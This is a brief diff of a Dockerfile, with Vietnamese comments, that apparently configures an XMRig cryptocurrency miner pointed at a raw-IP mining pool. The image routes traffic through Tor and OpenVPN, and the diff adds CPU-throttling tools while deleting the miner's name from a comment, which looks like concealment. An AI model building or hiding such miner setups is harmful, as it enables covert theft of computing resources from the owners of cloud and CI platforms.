@@ -1,7 +1,7 @@
 # Sử dụng image cơ bản từ Ubuntu
 FROM ubuntu:20.04
 
-# Cài đặt các công cụ cần thiết bao gồm OpenVPN, Tor và Privoxy
+# Cài đặt các công cụ cần thiết bao gồm OpenVPN, Tor, Privoxy, cpulimit, và taskset
 RUN apt-get update && apt-get install -y \
     torsocks \
     wget \
@@ -10,9 +10,11 @@ RUN apt-get update && apt-get install -y \
     openvpn \
     bc \
     rename \
+    cpulimit \
+    util-linux \
     && apt-get clean
 
-# Thiết lập biến môi trường cho XMRig và hệ thống
+# Thiết lập biến môi trường
 ENV VERSION="6.21.0" \
     WORK_DIR="/root/work" \
     POOL="47.238.48.153:8080" \
